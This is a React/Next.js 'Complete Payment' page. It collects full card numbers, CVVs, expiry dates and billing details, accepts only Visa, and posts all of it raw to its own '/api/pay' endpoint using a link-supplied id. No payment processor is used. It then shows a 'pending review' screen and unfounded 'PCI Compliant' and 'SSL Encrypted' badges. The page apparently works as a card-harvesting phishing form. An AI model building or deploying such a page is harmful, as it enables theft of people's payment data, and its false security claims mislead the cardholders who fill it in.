'use client';

import { useState, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';
import { Suspense } from 'react';

type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown' | null;

function detectCardType(number: string): CardType {
  const digits = number.replace(/\s/g, '');
  if (digits.length === 0) return null;
  if (/^4/.test(digits)) return 'visa';
  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'mastercard';
  if (/^3[47]/.test(digits)) return 'amex';
  if (/^6(?:011|5)/.test(digits)) return 'discover';
  return 'unknown';
}

function CardIcon({ type }: { type: CardType }) {
  if (type === 'visa') {
    return (
      <svg className="w-8 h-5" viewBox="0 0 50 32" fill="none">
        <rect width="50" height="32" rx="4" fill="#1A1F71"/>
        <text x="5" y="22" fontFamily="Arial" fontWeight="bold" fontSize="14" fill="white">VISA</text>
      </svg>
    );
  }
  if (type === 'mastercard') {
    return (
      <svg className="w-8 h-5" viewBox="0 0 50 32" fill="none">
        <circle cx="19" cy="16" r="10" fill="#EB001B"/>
        <circle cx="31" cy="16" r="10" fill="#F79E1B"/>
        <path d="M25 8.268a10 10 0 0 1 0 15.464A10 10 0 0 1 25 8.268z" fill="#FF5F00"/>
      </svg>
    );
  }
  return null;
}

function PaymentForm() {
  const searchParams = useSearchParams();
  const paymentId = searchParams.get('id') || '';

  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [cardType, setCardType] = useState<CardType>(null);
  const [cardError, setCardError] = useState('');

  const [form, setForm] = useState({
    cardholderName: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    billingEmail: '',
    billingPhone: '',
    billingAddress: '',
    billingCity: '',
    billingState: '',
    billingPostcode: '',
    billingCountry: '',
  });

  function formatCardNumber(value: string) {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(.{4})/g, '$1 ').trim();
  }

  function handleChange(e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) {
    const { name, value } = e.target;
    if (name === 'cardNumber') {
      const formatted = formatCardNumber(value);
      setForm((prev) => ({ ...prev, cardNumber: formatted }));

      const detected = detectCardType(formatted);
      setCardType(detected);

      if (detected === null) {
        setCardError('');
      } else if (detected === 'visa') {
        setCardError('');
      } else {
        setCardError('Only Visa cards are accepted. Please use a Visa card to continue.');
      }
    } else if (name === 'cvv') {
      setForm((prev) => ({ ...prev, cvv: value.replace(/\D/g, '').slice(0, 4) }));
    } else {
      setForm((prev) => ({ ...prev, [name]: value }));
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError('');

    if (!paymentId) {
      setError('Invalid payment link. Please check your link and try again.');
      return;
    }

    if (cardType !== 'visa') {
      setCardError('Only Visa cards are accepted. Please use a Visa card to continue.');
      return;
    }

    setLoading(true);
    try {
      const res = await fetch('/api/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ paymentId, ...form }),
      });

      if (!res.ok) throw new Error('Submission failed');
      setSubmitted(true);
    } catch {
      setError('Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 12 }, (_, i) => currentYear + i);
  const months = [
    { value: '01', label: '01 - January' },
    { value: '02', label: '02 - February' },
    { value: '03', label: '03 - March' },
    { value: '04', label: '04 - April' },
    { value: '05', label: '05 - May' },
    { value: '06', label: '06 - June' },
    { value: '07', label: '07 - July' },
    { value: '08', label: '08 - August' },
    { value: '09', label: '09 - September' },
    { value: '10', label: '10 - October' },
    { value: '11', label: '11 - November' },
    { value: '12', label: '12 - December' },
  ];

  const countries = [
    'United Kingdom', 'Ireland', 'United States', 'Canada', 'Australia',
    'France', 'Germany', 'Spain', 'Italy', 'Netherlands', 'Belgium',
    'Sweden', 'Norway', 'Denmark', 'Finland', 'Switzerland', 'Austria',
    'Portugal', 'Poland', 'Other',
  ];

  const cardNumberBorderClass =
    cardError
      ? 'border-red-500/60 focus:ring-red-500/40 focus:border-red-500/60'
      : cardType === 'visa'
      ? 'border-emerald-500/50 focus:ring-emerald-500/40 focus:border-emerald-500/50'
      : 'border-white/10 focus:ring-emerald-500/50 focus:border-emerald-500/50';

  if (submitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-8 text-center shadow-2xl">
            <div className="w-20 h-20 rounded-full bg-amber-500/20 border-2 border-amber-400 flex items-center justify-center mx-auto mb-6">
              <svg className="w-10 h-10 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-white mb-3">Payment Pending</h2>
            <p className="text-slate-300 text-base leading-relaxed mb-6">
              Your payment is currently <span className="text-amber-400 font-semibold">pending review</span>. Our team will contact you shortly with confirmation once it has been verified.
            </p>
            <div className="bg-white/5 rounded-xl p-4 border border-white/10">
              <p className="text-xs text-slate-400 mb-1">Payment Reference</p>
              <p className="text-sm font-mono text-slate-200 break-all">{paymentId}</p>
            </div>
            <div className="mt-6 flex items-center justify-center gap-2 text-slate-400 text-sm">
              <div className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
              Awaiting confirmation...
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 py-10 px-4">
      <div className="w-full max-w-lg mx-auto">
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 bg-white/5 border border-white/10 rounded-full px-4 py-1.5 text-xs text-slate-400 mb-4">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            Secure Payment
          </div>
          <h1 className="text-3xl font-bold text-white mb-2">Complete Payment</h1>
          <p className="text-slate-400 text-sm">Enter your card and billing details below</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Card Details */}
          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-6 shadow-2xl">
            <div className="flex items-center gap-2 mb-5">
              <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <rect x="1" y="4" width="22" height="16" rx="2" ry="2" strokeWidth="1.5"/>
                <line x1="1" y1="10" x2="23" y2="10" strokeWidth="1.5"/>
              </svg>
              <h2 className="text-sm font-semibold text-white">Card Details</h2>
              <div className="ml-auto flex items-center gap-2">
                <div className={`flex items-center gap-1.5 rounded-lg px-2.5 py-1 border transition-all duration-200 ${
                  cardType === 'visa'
                    ? 'bg-emerald-500/10 border-emerald-500/40'
                    : cardType !== null && cardType !== 'visa'
                    ? 'bg-white/5 border-white/10 opacity-30'
                    : 'bg-white/5 border-white/10'
                }`}>
                  <svg className="w-7 h-4" viewBox="0 0 50 32" fill="none">
                    <rect width="50" height="32" rx="4" fill="#1A1F71"/>
                    <text x="4" y="22" fontFamily="Arial" fontWeight="bold" fontSize="14" fill="white">VISA</text>
                  </svg>
                  {cardType === 'visa' && (
                    <svg className="w-3 h-3 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  )}
                </div>
                <span className={`text-xs text-slate-500 transition-opacity ${
                  cardType !== null && cardType !== 'visa' ? 'opacity-100' : 'opacity-50'
                }`}>Visa only</span>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1.5">Cardholder Name</label>
                <input
                  type="text"
                  name="cardholderName"
                  value={form.cardholderName}
                  onChange={handleChange}
                  placeholder="John Smith"
                  required
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1.5">Card Number</label>
                <div className="relative">
                  <input
                    type="text"
                    name="cardNumber"
                    value={form.cardNumber}
                    onChange={handleChange}
                    placeholder="0000 0000 0000 0000"
                    required
                    inputMode="numeric"
                    className={`w-full bg-white/5 border rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm font-mono tracking-wider focus:outline-none focus:ring-2 transition pr-14 ${cardNumberBorderClass}`}
                  />
                  <div className="absolute right-4 top-1/2 -translate-y-1/2">
                    {cardType === 'visa' && (
                      <svg className="w-9 h-5" viewBox="0 0 50 32" fill="none">
                        <rect width="50" height="32" rx="4" fill="#1A1F71"/>
                        <text x="4" y="22" fontFamily="Arial" fontWeight="bold" fontSize="14" fill="white">VISA</text>
                      </svg>
                    )}
                    {(cardType === 'mastercard') && (
                      <svg className="w-8 h-5" viewBox="0 0 50 32" fill="none">
                        <circle cx="19" cy="16" r="10" fill="#EB001B"/>
                        <circle cx="31" cy="16" r="10" fill="#F79E1B"/>
                        <path d="M25 8.268a10 10 0 0 1 0 15.464A10 10 0 0 1 25 8.268z" fill="#FF5F00"/>
                      </svg>
                    )}
                    {(cardType === 'amex' || cardType === 'discover' || cardType === 'unknown') && (
                      <svg className="w-5 h-5 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" strokeWidth="1.5"/>
                        <line x1="1" y1="10" x2="23" y2="10" strokeWidth="1.5"/>
                      </svg>
                    )}
                    {cardType === null && (
                      <svg className="w-5 h-5 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" strokeWidth="1.5"/>
                        <line x1="1" y1="10" x2="23" y2="10" strokeWidth="1.5"/>
                      </svg>
                    )}
                  </div>
                </div>
                {cardError && (
                  <div className="mt-2 flex items-start gap-2 text-red-400 text-xs">
                    <svg className="w-3.5 h-3.5 mt-0.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    {cardError}
                  </div>
                )}
                {cardType === 'visa' && (
                  <div className="mt-2 flex items-center gap-2 text-emerald-400 text-xs">
                    <svg className="w-3.5 h-3.5 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    Visa card detected
                  </div>
                )}
              </div>

              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Month</label>
                  <select
                    name="expiryMonth"
                    value={form.expiryMonth}
                    onChange={handleChange}
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-3 text-white text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition appearance-none cursor-pointer"
                  >
                    <option value="" className="bg-slate-800">MM</option>
                    {months.map((m) => (
                      <option key={m.value} value={m.value} className="bg-slate-800">{m.value}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Year</label>
                  <select
                    name="expiryYear"
                    value={form.expiryYear}
                    onChange={handleChange}
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-3 text-white text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition appearance-none cursor-pointer"
                  >
                    <option value="" className="bg-slate-800">YYYY</option>
                    {years.map((y) => (
                      <option key={y} value={String(y)} className="bg-slate-800">{y}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">CVV / CVC</label>
                  <input
                    type="password"
                    name="cvv"
                    value={form.cvv}
                    onChange={handleChange}
                    placeholder="•••"
                    required
                    inputMode="numeric"
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-3 text-white placeholder-slate-500 text-sm font-mono tracking-widest focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Billing Info */}
          <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-6 shadow-2xl">
            <div className="flex items-center gap-2 mb-5">
              <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
              <h2 className="text-sm font-semibold text-white">Billing Information</h2>
            </div>

            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Email Address</label>
                  <input
                    type="email"
                    name="billingEmail"
                    value={form.billingEmail}
                    onChange={handleChange}
                    placeholder="john@example.com"
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Phone Number</label>
                  <input
                    type="tel"
                    name="billingPhone"
                    value={form.billingPhone}
                    onChange={handleChange}
                    placeholder="+44 7700 000000"
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1.5">Billing Address</label>
                <input
                  type="text"
                  name="billingAddress"
                  value={form.billingAddress}
                  onChange={handleChange}
                  placeholder="123 High Street"
                  required
                  className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">City</label>
                  <input
                    type="text"
                    name="billingCity"
                    value={form.billingCity}
                    onChange={handleChange}
                    placeholder="London"
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">County / State</label>
                  <input
                    type="text"
                    name="billingState"
                    value={form.billingState}
                    onChange={handleChange}
                    placeholder="Greater London"
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Postcode / ZIP</label>
                  <input
                    type="text"
                    name="billingPostcode"
                    value={form.billingPostcode}
                    onChange={handleChange}
                    placeholder="SW1A 1AA"
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-slate-500 text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition"
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1.5">Country</label>
                  <select
                    name="billingCountry"
                    value={form.billingCountry}
                    onChange={handleChange}
                    required
                    className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 focus:border-emerald-500/50 transition appearance-none cursor-pointer"
                  >
                    <option value="" className="bg-slate-800">Select...</option>
                    {countries.map((c) => (
                      <option key={c} value={c} className="bg-slate-800">{c}</option>
                    ))}
                  </select>
                </div>
              </div>
            </div>
          </div>

          {error && (
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl px-4 py-3 text-red-400 text-sm flex items-center gap-2">
              <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              {error}
            </div>
          )}

          <button
            type="submit"
            disabled={loading || !!cardError || (cardType !== null && cardType !== 'visa')}
            className="w-full bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-4 rounded-xl text-sm transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20"
          >
            {loading ? (
              <>
                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
                </svg>
                Processing...
              </>
            ) : (
              <>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                Pay Securely
              </>
            )}
          </button>

          <div className="flex items-center justify-center gap-4 text-slate-500 text-xs pb-4">
            <div className="flex items-center gap-1.5">
              <svg className="w-3.5 h-3.5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              SSL Encrypted
            </div>
            <div className="flex items-center gap-1.5">
              <svg className="w-3.5 h-3.5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              256-bit Secure
            </div>
            <div className="flex items-center gap-1.5">
              <svg className="w-3.5 h-3.5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              PCI Compliant
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function PayPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-emerald-400 border-t-transparent rounded-full animate-spin" />
      </div>
    }>
      <PaymentForm />
    </Suspense>
  );
}
